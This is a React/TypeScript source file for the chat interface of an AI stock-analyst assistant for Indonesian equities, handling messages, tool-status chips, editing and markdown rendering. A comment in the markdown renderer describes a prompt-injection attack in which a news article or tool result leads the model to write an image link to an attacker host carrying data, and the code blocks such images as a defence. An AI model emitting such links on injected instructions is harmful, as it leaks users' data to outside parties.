"use client";

import clsx from "clsx";
import { Check, CircleAlert, Copy, MessageSquarePlus, Pencil, RefreshCw, RotateCcw, Square } from "lucide-react";
import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent, type ReactNode } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { Button } from "../controls";
import { useAnalyst, type ToolChip, type UiMessage } from "./AnalystProvider";

function suggestionsFor(symbol: string | null): string[] {
  if (symbol) {
    return [
      `Give me a full read on ${symbol}: trend, broker flow, valuation and news.`,
      `Who has been accumulating ${symbol} over the last 3 months, and at what average price?`,
      `Is ${symbol} cheap against its peers? Show P/E, P/B and ROE.`,
      `What are the key support and resistance levels for ${symbol} right now?`,
    ];
  }
  return [
    "How is the market today? Summarize IHSG, top movers and foreign flows.",
    "Which stocks have foreign brokers been accumulating over the last two weeks?",
    "Find banks with ROE above 15% and P/E below 12.",
    "Review my portfolio: concentration, weak spots and anything to watch.",
  ];
}

function ToolChips({ tools }: { tools: ToolChip[] }) {
  if (!tools.length) return null;
  return (
    <ul className="mb-3 flex flex-wrap gap-1.5" aria-label="Data the analyst read">
      {tools.map((t) => (
        <li
          key={t.id}
          title={t.detail}
          className={clsx(
            "inline-flex items-center gap-1.5 rounded border px-2 py-0.5 text-xs",
            t.status === "error" ? "border-down/30 text-down" : "border-rule bg-paper text-ink-2",
          )}
        >
          {t.status === "running" ? (
            <span aria-hidden className="size-2.5 animate-spin rounded-full border-[1.5px] border-rule-strong border-t-kunyit-deep" />
          ) : t.status === "done" ? (
            <Check aria-hidden className="size-3 text-ink-3" />
          ) : (
            <CircleAlert aria-hidden className="size-3" />
          )}
          {t.label}
          {t.status === "error" && t.detail && <span className="sr-only">: {t.detail}</span>}
        </li>
      ))}
    </ul>
  );
}

/** A small icon button under a message. */
function Action({ label, onClick, disabled, children }: { label: string; onClick: () => void; disabled?: boolean; children: ReactNode }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={disabled}
      aria-label={label}
      title={label}
      className="inline-flex size-7 items-center justify-center rounded text-ink-3 hover:bg-wash hover:text-ink disabled:pointer-events-none disabled:opacity-40"
    >
      {children}
    </button>
  );
}

function CopyAction({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  useEffect(() => {
    if (!copied) return;
    const t = setTimeout(() => setCopied(false), 1500);
    return () => clearTimeout(t);
  }, [copied]);
  return (
    <Action
      label={copied ? "Copied" : "Copy"}
      onClick={() => {
        void navigator.clipboard
          ?.writeText(text)
          .then(() => setCopied(true))
          .catch(() => undefined);
      }}
    >
      {copied ? <Check aria-hidden className="size-3.5" /> : <Copy aria-hidden className="size-3.5" />}
    </Action>
  );
}

/** Actions show on hover for older messages, and always for the latest one and on touch screens. */
const actionRow = (latest: boolean) =>
  clsx("mt-1 flex items-center gap-0.5 transition-opacity", !latest && "sm:opacity-0 sm:group-hover:opacity-100 sm:group-focus-within:opacity-100");

function UserMessage({ message, latest }: { message: UiMessage; latest: boolean }) {
  const { busy, edit, regenerate } = useAnalyst();
  const [editing, setEditing] = useState(false);
  const [draft, setDraft] = useState(message.content);
  const ref = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    if (!editing) return;
    const el = ref.current;
    el?.focus();
    el?.setSelectionRange(el.value.length, el.value.length);
  }, [editing]);

  const save = () => {
    if (!draft.trim() || busy) return;
    setEditing(false);
    edit(message.id, draft);
  };

  if (editing) {
    return (
      <div className="border-l-2 border-kunyit pl-3">
        <label htmlFor={`edit-${message.id}`} className="sr-only">
          Edit your message
        </label>
        <textarea
          id={`edit-${message.id}`}
          ref={ref}
          value={draft}
          onChange={(e) => setDraft(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) {
              e.preventDefault();
              save();
            }
            if (e.key === "Escape") {
              e.stopPropagation();
              setEditing(false);
              setDraft(message.content);
            }
          }}
          rows={Math.min(8, Math.max(2, draft.split("\n").length))}
          className="w-full resize-none rounded border border-rule-strong bg-sheet px-3 py-2 text-sm focus:border-ink focus:outline-none"
        />
        <div className="mt-2 flex items-center justify-end gap-2">
          <span className="mr-auto text-xs text-ink-3">Sending replaces this message and everything after it.</span>
          <Button
            size="sm"
            variant="ghost"
            onClick={() => {
              setEditing(false);
              setDraft(message.content);
            }}
          >
            Cancel
          </Button>
          <Button size="sm" variant="primary" onClick={save} disabled={!draft.trim() || busy}>
            Send
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="group">
      <div className="border-l-2 border-kunyit pl-3">
        <p className="text-[15px] font-semibold whitespace-pre-wrap">{message.content}</p>
        {message.symbol && <p className="mt-0.5 text-xs text-ink-3">While viewing {message.symbol}</p>}
      </div>
      <div className={actionRow(latest)}>
        <Action
          label="Edit"
          disabled={busy}
          onClick={() => {
            setDraft(message.content);
            setEditing(true);
          }}
        >
          <Pencil aria-hidden className="size-3.5" />
        </Action>
        <Action label="Resend" disabled={busy} onClick={() => regenerate(message.id)}>
          <RotateCcw aria-hidden className="size-3.5" />
        </Action>
        <CopyAction text={message.content} />
      </div>
    </div>
  );
}

/** Shown until the first words arrive, with a running clock so a slow answer doesn't look stuck. */
function Thinking({ reading }: { reading: boolean }) {
  const [seconds, setSeconds] = useState(0);
  useEffect(() => {
    const started = Date.now();
    const timer = setInterval(() => setSeconds(Math.floor((Date.now() - started) / 1000)), 1000);
    return () => clearInterval(timer);
  }, []);
  return (
    <p className="flex items-center gap-2 text-[13px] text-ink-3" role="status">
      <span aria-hidden className="size-2.5 animate-spin rounded-full border-[1.5px] border-rule-strong border-t-kunyit-deep" />
      {reading ? "Reading the question" : "Thinking it through"}
      <span className="tnum" aria-hidden>
        {seconds > 0 ? `${seconds}s` : ""}
      </span>
    </p>
  );
}

function AssistantMessage({ message, latest }: { message: UiMessage; latest: boolean }) {
  const { busy, regenerate } = useAnalyst();
  return (
    <div className="group">
      <ToolChips tools={message.tools ?? []} />
      {message.content ? (
        <div className="prose-note">
          <ReactMarkdown
            remarkPlugins={[remarkGfm]}
            components={{
              table: ({ children }) => (
                <div className="table-wrap">
                  <table>{children}</table>
                </div>
              ),
              // Links open only when clicked, in a new tab, without a referrer.
              a: ({ href, children }) => (
                <a href={href} target="_blank" rel="noopener noreferrer" referrerPolicy="no-referrer">
                  {children}
                </a>
              ),
              // Never load images from model output. A news article or tool result could
              // carry text that makes the model write ![](https://attacker/?data=...), and
              // the browser would send that request without the visitor doing anything.
              img: ({ alt }) => (alt ? <span className="text-ink-3">[image: {alt}]</span> : null),
            }}
          >
            {message.content}
          </ReactMarkdown>
        </div>
      ) : message.pending ? (
        <Thinking reading={!message.tools?.length} />
      ) : null}
      {message.error && (
        <div role="alert" className="mt-2 flex flex-wrap items-center gap-2 text-[13px] text-down">
          {message.error}
          {!busy && (
            <Button size="sm" variant="secondary" onClick={() => regenerate(message.id)}>
              <RefreshCw aria-hidden className="size-3" />
              Try again
            </Button>
          )}
        </div>
      )}
      {!message.pending && (message.content || message.error) && (
        <div className={actionRow(latest)}>
          {message.content && <CopyAction text={message.content} />}
          <Action label="Regenerate" disabled={busy} onClick={() => regenerate(message.id)}>
            <RefreshCw aria-hidden className="size-3.5" />
          </Action>
        </div>
      )}
    </div>
  );
}

export function ChatView({ compact = false }: { compact?: boolean }) {
  const { messages, busy, ask, stop, clear, symbol } = useAnalyst();
  const [draft, setDraft] = useState("");
  const scrollRef = useRef<HTMLDivElement>(null);
  const stickRef = useRef(true);
  const inputRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    const el = scrollRef.current;
    if (el && stickRef.current) el.scrollTop = el.scrollHeight;
  }, [messages]);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const submit = (e?: FormEvent) => {
    e?.preventDefault();
    if (!draft.trim() || busy) return;
    stickRef.current = true;
    ask(draft);
    setDraft("");
  };

  const onKeyDown = (e: KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) submit(e);
  };

  return (
    <div className="flex h-full min-h-0 flex-col">
      <div
        ref={scrollRef}
        onScroll={(e) => {
          const el = e.currentTarget;
          stickRef.current = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
        }}
        className={clsx("min-h-0 flex-1 overflow-y-auto", compact ? "px-5 py-4" : "py-6")}
        aria-live="polite"
      >
        {messages.length === 0 ? (
          <div className={clsx(!compact && "max-w-2xl")}>
            <p className="text-[15px] text-ink-2">
              Ask about any IDX stock, the market, or your portfolio. The analyst reads live data from Sectors and the broker summaries, and says where each
              number came from.
            </p>
            <ul className="mt-4 space-y-2">
              {suggestionsFor(symbol).map((s) => (
                <li key={s}>
                  <button
                    type="button"
                    onClick={() => ask(s)}
                    className="w-full rounded border border-rule bg-sheet px-3 py-2 text-left text-sm text-ink hover:border-rule-strong hover:bg-wash"
                  >
                    {s}
                  </button>
                </li>
              ))}
            </ul>
          </div>
        ) : (
          <ol className={clsx("space-y-6", !compact && "max-w-3xl")}>
            {messages.map((m, i) => {
              // The latest question and answer keep their actions visible.
              const latest = i >= messages.length - 2;
              return <li key={m.id}>{m.role === "user" ? <UserMessage message={m} latest={latest} /> : <AssistantMessage message={m} latest={latest} />}</li>;
            })}
          </ol>
        )}
      </div>

      <form onSubmit={submit} className={clsx("border-t border-rule bg-sheet", compact ? "px-5 py-3" : "py-4")}>
        <label htmlFor="analyst-input" className="sr-only">
          Ask the analyst
        </label>
        <textarea
          id="analyst-input"
          ref={inputRef}
          value={draft}
          onChange={(e) => setDraft(e.target.value)}
          onKeyDown={onKeyDown}
          rows={compact ? 2 : 3}
          placeholder={symbol ? `Ask about ${symbol} or anything on IDX` : "Ask about a stock, the market, or your portfolio"}
          className="w-full resize-none rounded border border-rule-strong bg-sheet px-3 py-2 text-sm placeholder:text-ink-3 focus:border-ink focus:outline-none"
        />
        <div className="mt-2 flex items-center justify-between gap-2">
          {/* In the side drawer, New chat sits in the drawer's header instead. */}
          {compact ? (
            <span />
          ) : (
            <Button
              variant="ghost"
              size="sm"
              onClick={() => {
                clear();
                setDraft("");
                inputRef.current?.focus();
              }}
              disabled={messages.length === 0}
            >
              <MessageSquarePlus aria-hidden className="size-3.5" />
              New chat
            </Button>
          )}
          <div className="flex items-center gap-2">
            <span className="hidden text-xs text-ink-3 sm:inline">Enter to send, Shift+Enter for a new line</span>
            {busy ? (
              <Button variant="secondary" size="sm" onClick={stop}>
                <Square aria-hidden className="size-3" />
                Stop
              </Button>
            ) : (
              <Button type="submit" variant="primary" size="sm" disabled={!draft.trim()}>
                Send
              </Button>
            )}
          </div>
        </div>
      </form>
    </div>
  );
}
